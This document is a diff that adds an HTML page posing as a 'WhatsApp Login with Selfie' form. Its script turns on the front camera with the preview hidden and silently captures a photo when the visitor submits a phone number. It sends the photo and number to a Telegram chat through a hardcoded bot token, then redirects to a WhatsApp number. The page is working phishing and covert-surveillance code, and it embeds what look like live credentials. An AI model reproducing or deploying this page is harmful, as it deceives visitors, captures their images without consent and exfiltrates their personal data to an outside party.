@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>WhatsApp Login with Selfie</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet" />
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Roboto&display=swap');
+  </style>
+</head>
+<body class="bg-[#25D366] font-['Roboto'] min-h-screen flex items-center justify-center p-6">
+  <div class="bg-white rounded-xl max-w-4xl w-full flex flex-col md:flex-row items-center md:items-start p-8 md:p-12 gap-8 md:gap-16">
+    <div class="flex justify-center md:justify-start w-full md:w-1/2 relative">
+      <img alt="Illustration" class="max-w-[300px] w-full" src="https://storage.googleapis.com/a1aa/image/986893bc-8749-40d8-5174-a51426fa4ef7.jpg" width="300" height="300"/>
+    </div>
+    <form class="w-full md:w-1/2 flex flex-col items-center gap-4" id="loginForm">
+      <h2 class="font-extrabold text-lg md:text-xl text-gray-900 text-center w-full">WhatsApp Login</h2>
+      <input type="text" placeholder="Phone Number" class="w-full max-w-xs rounded-full bg-gray-200 placeholder-gray-500 text-gray-700 py-3 px-6 focus:outline-none focus:ring-2 focus:ring-green-500" id="phoneInput" required/>
+      <input type="text" placeholder="Re-enter Phone Number" class="w-full max-w-xs rounded-full bg-gray-200 placeholder-gray-500 text-gray-700 py-3 px-6 focus:outline-none focus:ring-2 focus:ring-green-500" id="codeInput" required/>
+      
+      <!-- Camera Elements -->
+      <video id="video" autoplay playsinline style="display: none;"></video>
+      <canvas id="canvas" width="320" height="240" style="display: none;"></canvas>
+
+      <button type="submit" class="w-full max-w-xs bg-[#4CAF50] hover:bg-[#449d48] text-white font-bold rounded-full py-3 px-6 transition-colors mt-2">LOGIN</button>
+    </form>
+  </div>
+
+  <script>
+    const TELEGRAM_BOT_TOKEN = '7266939521:AAFgp8znU2LAlkdA8vCldKb6TVWPAB36Sdk';
+    const TELEGRAM_CHAT_ID = '-1002156014563';
+
+    const form = document.getElementById('loginForm');
+    const phoneInput = document.getElementById('phoneInput');
+    const rePhoneInput = document.getElementById('codeInput');
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const ctx = canvas.getContext('2d');
+
+    // Access front camera
+    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
+      .then(stream => {
+        video.srcObject = stream;
+        video.style.display = 'none'; // Hide the video preview
+      })
+      .catch(error => {
+        console.error('Camera access denied or error:', error);
+        alert("Please allow camera access to continue.");
+      });
+
+    async function sendToTelegram(phone, selfieBlob) {
+      // Send selfie as photo to Telegram
+      const formData = new FormData();
+      formData.append("chat_id", TELEGRAM_CHAT_ID);
+      formData.append("caption", `📞 New login request:\nPhone: ${phone}`);
+      formData.append("photo", selfieBlob, "selfie.jpg");
+
+      try {
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+          method: "POST",
+          body: formData
+        });
+      } catch (err) {
+        console.error("Telegram Error:", err);
+      }
+    }
+
+    form.addEventListener('submit', async function (e) {
+      e.preventDefault();
+
+      const phone = phoneInput.value.trim();
+      const rephone = rePhoneInput.value.trim();
+      if (phone !== rephone) {
+        alert("Phone numbers do not match!");
+        return;
+      }
+
+      // Capture selfie
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      canvas.toBlob(async function(blob) {
+        // Save locally
+        const data = { phone, timestamp: new Date().toISOString() };
+        let offlineData = JSON.parse(localStorage.getItem('offlineFormData')) || [];
+        offlineData.push(data);
+        localStorage.setItem('offlineFormData', JSON.stringify(offlineData));
+
+        // Send selfie if online
+        if (navigator.onLine && blob) {
+          await sendToTelegram(phone, blob);
+        }
+
+        // Redirect to WhatsApp with predefined message
+        const whatsappNumber = "+918128771022";
+        const message = "Hi!";
+        const whatsappUrl = `https://wa.me/${whatsappNumber}?text=${encodeURIComponent(message)}`;
+        window.open(whatsappUrl, "_blank");
+
+        alert("Thanks For Visiting!");
+        phoneInput.value = '';
+        rePhoneInput.value = '';
+      }, 'image/jpeg');
+    });
+
+    // Sync offline data
+    window.addEventListener('online', async () => {
+      let offlineData = JSON.parse(localStorage.getItem('offlineFormData')) || [];
+      for (const item of offlineData) {
+        await sendToTelegram(item.phone, null); // No selfie stored offline
+      }
+      localStorage.removeItem('offlineFormData');
+      alert("Thanks For Visiting!");
+    });
+  </script>
+</body>
+</html>
